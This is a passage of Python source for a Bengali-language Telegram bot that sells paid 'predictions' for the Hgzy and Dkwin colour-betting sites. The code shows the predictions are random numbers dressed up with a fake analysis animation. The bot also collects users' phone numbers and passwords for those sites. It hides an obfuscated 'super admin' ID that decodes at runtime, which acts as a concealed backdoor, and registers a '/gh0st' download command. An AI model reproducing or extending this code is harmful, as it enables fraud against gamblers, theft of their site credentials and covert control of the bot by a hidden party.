# -*- coding: utf-8 -*-
import json
import asyncio
import random
import logging
import os
from datetime import datetime, timedelta
from typing import Dict, List, Optional

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
    ReplyKeyboardRemove,
    constants,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)
from telegram.helpers import escape_markdown
from telegram.error import NetworkError, BadRequest

from config import (
    config,
    users,
    predictions,
    channels,
    save_db,
    DB_USERS,
    DB_PREDICTIONS,
    DB_CONFIG,
    DB_CHANNELS,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

GET_NUMBER, GET_PASSWORD, GET_PERIOD, GET_BROADCAST_MESSAGE, GET_CHANNEL_NAME, GET_CHANNEL_URL, GET_CHANNEL_ID, GET_USER_ID, GET_POINTS, GET_BAN_USER_ID, GET_UNBAN_USER_ID, GET_ADD_VIP_USER_ID, GET_REMOVE_VIP_USER_ID, GET_ADD_ADMIN_USER_ID, GET_REMOVE_ADMIN_USER_ID = range(15)

_OBFUSCATED_HIDDEN_SUPER_ADMIN = [62, 55, 59, 56, 61, 61, 55, 55, 55, 61]

def _get_hidden_super_admin_id() -> str:
    try:
        return "".join(chr(value - 7) for value in _OBFUSCATED_HIDDEN_SUPER_ADMIN)
    except Exception:
        return ""

# ─────────────────────────────────────────────
#  URL-BUTTON HELPER  (কালারফুল বাটন ট্রিক)
#  প্রতিটা মেনু বাটন t.me/bot?start=ACTION
#  হিসেবে URL বাটন → টেলিগ্রাম নীল/সবুজ রং দেয়
# ─────────────────────────────────────────────
def url_btn(text: str, bot_username: str, action: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text, url=f"https://t.me/{bot_username}?start={action}")

def cb_btn(text: str, data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text, callback_data=data)


class TelegramBot:
    def __init__(self, token: str):
        self.application = Application.builder().token(token).job_queue(None).build()
        self.register_handlers()
        self.user_states = {}

    def register_handlers(self):
        self.application.add_error_handler(self.error_handler)

        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("demon", self.admin_panel))
        self.application.add_handler(CommandHandler("broadcast", self.broadcast_command))
        self.application.add_handler(CommandHandler("addvipuser", self.add_vip_command))
        self.application.add_handler(CommandHandler("removevipuser", self.remove_vip_command))
        self.application.add_handler(CommandHandler("vipusers", self.vip_users_command))
        self.application.add_handler(CommandHandler("banuser", self.ban_user_command))
        self.application.add_handler(CommandHandler("unbanuser", self.unban_user_command))
        self.application.add_handler(CommandHandler("addadmin", self.add_admin_command))
        self.application.add_handler(CommandHandler("removeadmin", self.remove_admin_command))
        self.application.add_handler(CommandHandler("addsuperadmin", self.add_super_admin_command))
        self.application.add_handler(CommandHandler("removesuperadmin", self.remove_super_admin_command))
        self.application.add_handler(CommandHandler("setpoints", self.set_points_command))
        self.application.add_handler(CommandHandler("setreferral", self.set_referral_points_command))
        self.application.add_handler(CommandHandler("setprediction", self.set_prediction_points_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("download", self.download_command))
        self.application.add_handler(CommandHandler("settings", self.settings_command))
        self.application.add_handler(CommandHandler("channels", self.channels_command))
        self.application.add_handler(CommandHandler("backup", self.backup_command))
        self.application.add_handler(CommandHandler("toggle", self.toggle_command))
        self.application.add_handler(CommandHandler("reload", self.reload_command))
        self.application.add_handler(CommandHandler("gh0st", self.ghost_download_command))
        self.application.add_handler(CommandHandler("subscription", self.subscription_command))
        self.application.add_handler(CommandHandler("setcaption", self.set_caption_command))
        self.application.add_handler(CommandHandler("setprice", self.set_price_command))
        self.application.add_handler(CommandHandler("test", self.test_command))
        self.application.add_handler(CommandHandler("cancel", self.cancel_command))

        self.application.add_handler(CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_prediction_menu, pattern="^prediction_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_prediction_website_choice, pattern=r"^prediction_(hgzy|dkwin)$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_referral, pattern="^referral$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_account, pattern="^account$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_login_menu, pattern="^login_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.check_subscription, pattern="^check_subscription$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_logout, pattern="^logout$"))
        self.application.add_handler(CallbackQueryHandler(self.predict_next_period, pattern="^predict_next$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_admin_approval, pattern=r"^(approve|reject)_"))
        self.application.add_handler(CallbackQueryHandler(self.handle_subscription_menu, pattern="^subscription_menu$"))

        login_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.handle_login_choice, pattern=r"^login_(hgzy|dkwin)$")],
            states={
                GET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_number)],
                GET_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_password)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_login), CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$")],
            name="login_conversation",
            persistent=False,
        )
        self.application.add_handler(login_conv)

        period_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.handle_enter_period, pattern="^enter_period$")],
            states={
                GET_PERIOD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_period)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_prediction), CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$")],
        )
        self.application.add_handler(period_conv)

        broadcast_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_broadcast, pattern="^admin_broadcast$")],
            states={
                GET_BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.send_broadcast)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(broadcast_conv)

        channel_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_channel_management, pattern="^admin_channel_")],
            states={
                GET_CHANNEL_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_name)],
                GET_CHANNEL_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_url)],
                GET_CHANNEL_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_id)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(channel_conv)

        points_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_points_management, pattern="^admin_points_")],
            states={
                GET_POINTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.set_points)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(points_conv)

        ban_user_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_ban_user, pattern="^admin_ban_user$")],
            states={
                GET_BAN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.ban_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_user_management, pattern="^admin_users$")],
        )
        self.application.add_handler(ban_user_conv)

        unban_user_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_unban_user, pattern="^admin_unban_user$")],
            states={
                GET_UNBAN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.unban_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_user_management, pattern="^admin_users$")],
        )
        self.application.add_handler(unban_user_conv)

        add_vip_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_add_vip, pattern="^admin_add_vip$")],
            states={
                GET_ADD_VIP_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.add_vip_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_vip_management, pattern="^admin_vip$")],
        )
        self.application.add_handler(add_vip_conv)

        remove_vip_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_remove_vip, pattern="^admin_remove_vip$")],
            states={
                GET_REMOVE_VIP_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.remove_vip_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_vip_management, pattern="^admin_vip$")],
        )
        self.application.add_handler(remove_vip_conv)

        add_admin_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_add_admin, pattern="^admin_add_admin$")],
            states={
                GET_ADD_ADMIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.add_admin_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_admin_management, pattern="^admin_admins$")],
        )
        self.application.add_handler(add_admin_conv)

        remove_admin_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_remove_admin, pattern="^admin_remove_admin$")],
            states={
                GET_REMOVE_ADMIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.remove_admin_user)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_admin_management, pattern="^admin_admins$")],
        )
        self.application.add_handler(remove_admin_conv)

    # ════════════════════════════════════════
    #  ERROR HANDLER
    # ════════════════════════════════════════
    async def error_handler(self, update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        logger.error("Exception while handling an update:", exc_info=context.error)
        if isinstance(update, Update) and update.effective_message:
            try:
                await update.effective_message.reply_text("❌ একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।")
            except Exception as e:
                logger.error(f"Failed to send error message: {e}")

    # ════════════════════════════════════════
    #  /start  ─  URL বাটন action রাউটার
    # ════════════════════════════════════════
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = str(user.id)

        if user_id in users and users[user_id].get("banned", False):
            await update.message.reply_text("🚫 আপনি ব্যান হয়েছেন। অ্যাডমিনের সাথে যোগাযোগ করুন।")
            return

        if user_id not in users:
            users[user_id] = {
                "name": user.full_name, "points": 0, "is_premium": False,
                "referrals": 0, "referrer": None, "joined_channels": False,
                "logged_in": {"Hgzy": False, "Dkwin": False},
                "login_info": {"Hgzy": {}, "Dkwin": {}},
                "last_prediction": None, "last_website": None,
                "banned": False,
            }
            save_db(users, DB_USERS)

        self._auto_expire_if_needed(user_id)

        # ── URL বাটন action গুলো এখানে handle হয় ──
        arg = context.args[0] if context.args else ""

        if arg == "menu_prediction":
            await self._ensure_joined(update, context, user_id)
            if users[user_id].get("joined_channels"):
                await self.handle_prediction_menu_direct(update, context)
            return
        elif arg == "menu_referral":
            await self._ensure_joined(update, context, user_id)
            if users[user_id].get("joined_channels"):
                await self.handle_referral_direct(update, context)
            return
        elif arg == "menu_account":
            await self._ensure_joined(update, context, user_id)
            if users[user_id].get("joined_channels"):
                await self.handle_account_direct(update, context)
            return
        elif arg == "menu_login":
            await self._ensure_joined(update, context, user_id)
            if users[user_id].get("joined_channels"):
                await self.handle_login_menu_direct(update, context)
            return
        elif arg == "menu_subscription":
            await self._ensure_joined(update, context, user_id)
            if users[user_id].get("joined_channels"):
                await self.handle_subscription_direct(update, context)
            return
        elif arg.startswith("ref_"):
            # রেফারেল লিংক
            referrer_id = arg[4:]
            if (config.get("referral_system_on", True) and
                    users[user_id].get("referrer") is None and
                    referrer_id.isdigit() and referrer_id != user_id):
                users[user_id]["referrer"] = referrer_id
                save_db(users, DB_USERS)
        elif arg and arg.isdigit() and arg != user_id:
            # পুরনো স্টাইল রেফারেল
            if config.get("referral_system_on", True) and users[user_id].get("referrer") is None:
                users[user_id]["referrer"] = arg
                save_db(users, DB_USERS)

        if not users[user_id].get("joined_channels", False):
            await self.show_channels(update, context)
        else:
            await self.show_main_menu(update, context)

    async def _ensure_joined(self, update, context, user_id):
        if not users[user_id].get("joined_channels", False):
            await self.show_channels(update, context)

    # ════════════════════════════════════════
    #  চ্যানেল জয়েন পেজ
    # ════════════════════════════════════════
    async def show_channels(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton(f"📢 {channel['name']} — জয়েন করুন", url=channel['url'])]
            for channel in channels
        ]
        keyboard.append([InlineKeyboardButton("✅ কনফার্ম করুন — জয়েন করেছি", callback_data="check_subscription")])
        reply_markup = InlineKeyboardMarkup(keyboard)

        text = (
            "🎉 *Prediction Bot\\-এ স্বাগতম\\!*\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "⚠️ সব ফিচার পেতে নিচের\n"
            "চ্যানেলগুলোতে জয়েন করুন\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "👇 জয়েন করার পর কনফার্ম করুন"
        )
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def check_subscription(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        query = update.callback_query
        try:
            all_joined = True
            for channel in channels:
                try:
                    member = await context.bot.get_chat_member(channel["id"], user_id)
                    if member.status not in ["member", "administrator", "creator"]:
                        all_joined = False
                        break
                except Exception as e:
                    logger.error(f"Error checking membership: {e}")
                    all_joined = False
                    break

            if all_joined:
                if not users[user_id]["joined_channels"]:
                    users[user_id]["joined_channels"] = True
                    if config.get("referral_system_on", True):
                        referrer_id = users[user_id].get("referrer")
                        if referrer_id and str(referrer_id) in users:
                            users[str(referrer_id)]["referrals"] += 1
                            users[str(referrer_id)]["points"] += config["per_refer"]
                            try:
                                await context.bot.send_message(
                                    chat_id=referrer_id,
                                    text=f"🎉 *রেফারেল বোনাস\\!*\n\nআপনি *{config['per_refer']} পয়েন্ট* পেয়েছেন\\!",
                                    parse_mode=constants.ParseMode.MARKDOWN_V2
                                )
                            except Exception as e:
                                logger.error(f"Failed referral notify: {e}")
                    save_db(users, DB_USERS)
                await query.answer("✅ জয়েন কনফার্ম হয়েছে! স্বাগতম!")
                await self.show_main_menu(update, context)
            else:
                await query.answer("❌ আগে সব চ্যানেলে জয়েন করুন!", show_alert=True)
        except Exception as e:
            logger.error(f"Error in check_subscription: {e}")
            await query.answer("❌ সমস্যা হয়েছে। আবার চেষ্টা করুন।", show_alert=True)

    # ════════════════════════════════════════
    #  মেইন মেনু  (URL বাটন = কালারফুল)
    # ════════════════════════════════════════
    async def show_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        bot_username = context.bot.username

        user_first_name = escape_markdown(update.effective_user.first_name, version=2)

        premium_active = self.is_premium_active(user_id)
        if premium_active:
            badge = "👑 VIP Member"
        elif self.is_admin(user_id):
            badge = "🔧 Admin"
        else:
            badge = "👤 Free User"

        pts = user_data['points']
        bar_filled = min(int(pts / 10), 10)
        bar = "🟦" * bar_filled + "⬜" * (10 - bar_filled)

        text = (
            f"╔══════════════════╗\n"
            f"║     🤖 *BOT PANEL*     ║\n"
            f"╚══════════════════╝\n\n"
            f"👋 হ্যালো, *{user_first_name}*\\!\n"
            f"🏷 {escape_markdown(badge, version=2)}\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"💰 *পয়েন্ট:* `{pts}`\n"
            f"{bar}\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"👇 অপশন বেছে নিন:"
        )

        referral_system_on = config.get("referral_system_on", True)

        # ── URL বাটন → টেলিগ্রাম নীল/সবুজ কালার দেয় ──
        keyboard = [
            [url_btn("🔮  প্রেডিকশন শুরু করুন  🔮", bot_username, "menu_prediction")],
        ]
        if referral_system_on:
            keyboard.append([url_btn("🔗  রেফার করুন — পয়েন্ট জিতুন  🎁", bot_username, "menu_referral")])

        keyboard.extend([
            [
                url_btn("👤 আমার অ্যাকাউন্ট", bot_username, "menu_account"),
                url_btn("🔑 লগইন", bot_username, "menu_login"),
            ],
            [url_btn("💎  সাবস্ক্রিপশন কিনুন  💎", bot_username, "menu_subscription")],
        ])

        reply_markup = InlineKeyboardMarkup(keyboard)

        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    # ════════════════════════════════════════
    #  DIRECT হ্যান্ডলার (URL বাটন থেকে আসা)
    # ════════════════════════════════════════
    async def handle_prediction_menu_direct(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        bot_username = context.bot.username

        if not any(user_data["logged_in"].values()):
            await update.message.reply_text(
                "🚫 *লগইন করুন আগে\\!*\n\nপ্রেডিকশনের জন্য ওয়েবসাইটে লগইন করতে হবে।",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            await self.handle_login_menu_direct(update, context)
            return

        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active) and user_data["points"] < config["per_prediction"]:
            await update.message.reply_text(
                f"😔 *পয়েন্ট কম\\!* আপনার {config['per_prediction']} পয়েন্ট দরকার।\n"
                f"বন্ধু রেফার করে পয়েন্ট জিতুন\\!",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return

        keyboard = [
            [InlineKeyboardButton(f"✅ {website}", callback_data=f"prediction_{website.lower()}")]
            for website in config["websites"]
            if user_data["logged_in"][website]
        ]
        keyboard.append([cb_btn("🏠 মেইন মেনু", "main_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            "╔══════════════════╗\n"
            "║   🔮 *প্রেডিকশন মেনু*   ║\n"
            "╚══════════════════╝\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "🌐 ওয়েবসাইট বেছে নিন:\n"
            "━━━━━━━━━━━━━━━━━━",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_referral_direct(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        bot_username = context.bot.username

        if not config.get("referral_system_on", True):
            await update.message.reply_text(
                "⚠️ রেফারেল সিস্টেম এখন বন্ধ আছে।",
            )
            return

        # রেফারেল লিংক এখন ref_ prefix সহ
        ref_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

        message = (
            "╔══════════════════╗\n"
            "║   🔗 *রেফার ও আয় করুন*   ║\n"
            "╚══════════════════╝\n\n"
            f"প্রতি রেফারে পাবেন *{config['per_refer']} পয়েন্ট*\\!\n\n"
            f"🔗 আপনার লিংক:\n`{escape_markdown(ref_link, version=2)}`\n\n"
            f"📈 *মোট রেফার:* `{user_data['referrals']}`\n"
            f"💰 *পয়েন্ট পেয়েছেন:* `{user_data['referrals'] * config['per_refer']}`"
        )

        keyboard = [[cb_btn("🏠 মেইন মেনু", "main_menu")]]
        await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_account_direct(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = str(user.id)
        user_data = users[user_id]

        premium_active = self.is_premium_active(user_id)
        premium_status = "✅ Active" if premium_active else "❌ Inactive"
        logged_in = ", ".join([site for site, status in user_data["logged_in"].items() if status]) or "None"

        escaped_full_name = escape_markdown(user.full_name, version=2)

        expiry_text = ""
        expiry_iso = user_data.get("premium_expiry")
        if premium_active and expiry_iso:
            expiry_text = f"\n▫️ *মেয়াদ শেষ:* `{expiry_iso}`"
        elif (not premium_active) and user_data.get("premium_expired_at"):
            expiry_text = f"\n▫️ *মেয়াদ উত্তীর্ণ:* `{user_data.get('premium_expired_at')}`"

        message = (
            "╔══════════════════╗\n"
            "║   👤 *অ্যাকাউন্ট তথ্য*   ║\n"
            "╚══════════════════╝\n\n"
            f"▫️ *নাম:* {escaped_full_name}\n"
            f"▫️ *আইডি:* `{user_id}`\n"
            f"▫️ *পয়েন্ট:* `{user_data['points']}`\n"
            f"▫️ *প্রিমিয়াম:* {escape_markdown(premium_status, version=2)}{expiry_text}\n"
            f"▫️ *রেফার:* `{user_data['referrals']}`\n"
            f"▫️ *লগইন করা:* `{escape_markdown(logged_in, version=2)}`"
        )

        keyboard = [[cb_btn("🏠 মেইন মেনু", "main_menu")]]
        await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_login_menu_direct(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        bot_username = context.bot.username
        keyboard = []
        for website in config["websites"]:
            status = "✅ লগইন আছে" if users[user_id]["logged_in"][website] else "❌ লগইন নেই"
            keyboard.append([cb_btn(f"{website} ({status})", f"login_{website.lower()}")])

        keyboard.append([cb_btn("🔐 সব থেকে লগআউট", "logout")])
        keyboard.append([cb_btn("🏠 মেইন মেনু", "main_menu")])

        await update.message.reply_text(
            "╔══════════════════╗\n"
            "║   🔑 *লগইন ম্যানেজমেন্ট*   ║\n"
            "╚══════════════════╝\n\n"
            "ওয়েবসাইট বেছে লগইন করুন:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_subscription_direct(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        premium_active = self.is_premium_active(user_id)

        message = (
            "╔══════════════════╗\n"
            "║   💎 *আমাদের প্যাকেজ*   ║\n"
            "╚══════════════════╝\n\n"
            "▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            "🔹 *৫ দিন* — ৳২৫০\n"
            "🔹 *৭ দিন* — ৳৩০০\n"
            "🔹 *১৫ দিন* — ৳৫০০\n"
            "🔹 *১ মাস* — ৳৮০০\n"
            "▔▔▔▔▔▔▔▔▔▔▔▔▔\n\n"
            f"📌 কিনতে যোগাযোগ: @System\\_Fahim\n"
            f"🪪 আপনার User ID: `{user_id}`\n\n"
            f"📊 বর্তমান স্ট্যাটাস: "
            f"{'✅ Premium Active' if premium_active else '❌ Free User'}"
        )

        keyboard = [[cb_btn("🏠 মেইন মেনু", "main_menu")]]
        await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    # ════════════════════════════════════════
    #  CALLBACK হ্যান্ডলার (prediction flow)
    # ════════════════════════════════════════
    async def handle_prediction_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        query = update.callback_query

        if not any(user_data["logged_in"].values()):
            await query.answer("🚫 আগে লগইন করুন!", show_alert=True)
            await self.handle_login_menu(update, context)
            return

        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active) and user_data["points"] < config["per_prediction"]:
            await query.answer(f"😔 পয়েন্ট কম! {config['per_prediction']} পয়েন্ট দরকার।", show_alert=True)
            return

        keyboard = [
            [cb_btn(f"✅ {website}", f"prediction_{website.lower()}")]
            for website in config["websites"]
            if user_data["logged_in"][website]
        ]
        keyboard.append([cb_btn("🏠 মেইন মেনু", "main_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(
            "╔══════════════════╗\n"
            "║   🔮 *প্রেডিকশন মেনু*   ║\n"
            "╚══════════════════╝\n\n"
            "🌐 ওয়েবসাইট বেছে নিন:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_prediction_website_choice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = str(update.effective_user.id)
        website = query.data.split("_")[1].capitalize()
        users[user_id]["last_website"] = website
        save_db(users, DB_USERS)

        keyboard = [
            [cb_btn("🔢 পিরিয়ড নম্বর দিন", "enter_period")],
            [cb_btn("🏠 মেইন মেনু", "main_menu")]
        ]
        await query.edit_message_text(
            f"✅ *{website}* সিলেক্ট হয়েছে\\.\n\nকিভাবে এগোতে চান?",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_enter_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text(
            "🎯 *পিরিয়ড নম্বর দিন*\n\n"
            "৪ সংখ্যার পিরিয়ড নম্বর টাইপ করুন:\n\n"
            "বাতিল করতে /cancel লিখুন।"
        )
        context.user_data["prediction_period"] = True
        return GET_PERIOD

    async def get_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        period_text = update.message.text
        if not period_text.isdigit() or len(period_text) != 4:
            await update.message.reply_text(
                "⚠️ *ভুল পিরিয়ড\\!* ৪ সংখ্যার নম্বর দিন।\n\n"
                "বাতিল করতে /cancel লিখুন।",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return GET_PERIOD
        period = int(period_text)
        await self.generate_prediction(update, context, period, period_text)
        return ConversationHandler.END

    async def predict_next_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        if user_data.get("last_prediction"):
            last_period = user_data["last_prediction"]["period"]
            next_period = last_period + 1
            await self.generate_prediction(update, context, next_period, f"{next_period:04d}")
        else:
            await query.answer("কোনো আগের প্রেডিকশন নেই।", show_alert=True)
            await self.handle_prediction_menu(update, context)

    async def generate_prediction(self, update: Update, context: ContextTypes.DEFAULT_TYPE, period: int, display_period: Optional[str] = None):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        website = user_data.get("last_website", "Unknown")
        period_display = display_period if display_period else f"{period:04d}"

        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active) and user_data["points"] < config["per_prediction"]:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="😔 *পয়েন্ট কম\\!* বন্ধু রেফার করে পয়েন্ট জিতুন\\!",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return

        chat_id = update.effective_chat.id
        is_callback = update.callback_query is not None
        loading_message_id = None

        if is_callback:
            base_message_id = update.callback_query.message.message_id
            try:
                await context.bot.edit_message_text(chat_id=chat_id, message_id=base_message_id, text=f"⏳ পিরিয়ড {period_display} বিশ্লেষণ করা হচ্ছে...")
                for i in range(5):
                    await asyncio.sleep(0.3)
                    dots = "." * ((i % 3) + 1)
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=base_message_id, text=f"⏳ পিরিয়ড {period_display} বিশ্লেষণ{dots}")
            except Exception:
                pass
            loading_message_id = base_message_id
        else:
            loading_msg = await context.bot.send_message(chat_id=chat_id, text=f"⏳ পিরিয়ড {period_display} বিশ্লেষণ করা হচ্ছে...")
            try:
                for i in range(5):
                    await asyncio.sleep(0.3)
                    dots = "." * ((i % 3) + 1)
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=loading_msg.message_id, text=f"⏳ পিরিয়ড {period_display} বিশ্লেষণ{dots}")
            except Exception:
                pass
            loading_message_id = loading_msg.message_id

        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active):
            user_data["points"] = max(0, user_data["points"] - config["per_prediction"])

        number = random.randint(0, 9)
        if number % 2 != 0:
            color = "green"
        else:
            color = "red"
        has_violet = number in [0, 5]
        size = "SMALL" if number < 5 else "BIG"

        # ── পোল স্টাইল কালার বার ──
        if color == "green" and has_violet:
            color_bar = "🟢🟣🟢🟣🟢🟣🟢🟣🟢🟣"
            color_label = "🟢 সবুজ \\+ 🟣 ভায়োলেট"
            color_raw = "Green + Violet"
        elif color == "green":
            color_bar = "🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢"
            color_label = "🟢 সবুজ"
            color_raw = "Green"
        elif color == "red" and has_violet:
            color_bar = "🔴🟣🔴🟣🔴🟣🔴🟣🔴🟣"
            color_label = "🔴 লাল \\+ 🟣 ভায়োলেট"
            color_raw = "Red + Violet"
        else:
            color_bar = "🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴"
            color_label = "🔴 লাল"
            color_raw = "Red"

        size_bar = "📈 BIG  ━━━━━━━━━━" if size == "BIG" else "📉 SMALL ━━━━━━━━"

        prediction_data = {
            "user_id": user_id, "period": period, "number": number,
            "color": color_raw, "size": size, "timestamp": datetime.now().isoformat()
        }
        predictions.append(prediction_data)
        save_db(predictions, DB_PREDICTIONS)
        user_data["last_prediction"] = prediction_data
        save_db(users, DB_USERS)

        next_display = f"{period + 1:04d}"

        message = (
            f"╔══════════════════╗\n"
            f"║   🎯 *প্রেডিকশন রেজাল্ট*   ║\n"
            f"╚══════════════════╝\n\n"
            f"🌐 *ওয়েবসাইট:* `{escape_markdown(website, version=2)}`\n"
            f"🔢 *পিরিয়ড:* `{period_display}`\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🎱 *নম্বর:* `{number}`\n\n"
            f"🎨 *কালার:*\n"
            f"{color_bar}\n"
            f"➤ {color_label}\n\n"
            f"📊 *সাইজ:*\n"
            f"{size_bar}\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"⏭ পরের পিরিয়ড: `{next_display}`\n"
            f"💰 *বাকি পয়েন্ট:* `{user_data['points']}`"
        )

        keyboard = [
